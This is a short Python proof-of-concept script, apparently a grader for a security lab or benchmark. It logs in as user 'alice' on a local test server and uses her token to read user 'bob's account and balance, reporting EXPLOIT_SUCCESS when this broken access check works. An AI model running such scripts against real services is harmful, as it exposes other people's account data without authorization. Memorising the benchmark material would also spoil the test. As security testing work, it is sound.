import os
import sys
import requests

def main():
    base = os.environ.get("TARGET_URL", "http://localhost:8080").rstrip("/")
    try:
        login_resp = requests.post(
            f"{base}/api/auth/login",
            json={"Username": "alice", "Password": "alice-pw"},
            timeout=3,
        )
    except requests.RequestException as e:
        print(f"EXPLOIT_FAIL: login request error: {e}")
        return

    if login_resp.status_code != 200:
        print(f"EXPLOIT_FAIL: login failed with status {login_resp.status_code}")
        return

    try:
        token = login_resp.json().get("token")
    except ValueError:
        print("EXPLOIT_FAIL: login response was not valid JSON")
        return

    if not token:
        print("EXPLOIT_FAIL: no token returned from login")
        return

    try:
        acc_resp = requests.get(
            f"{base}/api/account/bob",
            headers={"Authorization": f"Bearer {token}"},
            timeout=3,
        )
    except requests.RequestException as e:
        print(f"EXPLOIT_FAIL: account request error: {e}")
        return

    if acc_resp.status_code != 200:
        print(f"EXPLOIT_FAIL: unexpected status {acc_resp.status_code} accessing bob's account")
        return

    try:
        data = acc_resp.json()
    except ValueError:
        print("EXPLOIT_FAIL: account response was not valid JSON")
        return

    acc_id = data.get("id") or data.get("Id")
    balance = data.get("balance") if "balance" in data else data.get("Balance")

    if acc_id == "bob" and balance is not None:
        print(f"EXPLOIT_SUCCESS: alice's token read bob's account — id={acc_id} balance={balance}")
    else:
        print(f"EXPLOIT_FAIL: response did not contain expected bob account data: {data}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"EXPLOIT_FAIL: unexpected error: {e}")
    sys.exit(0)

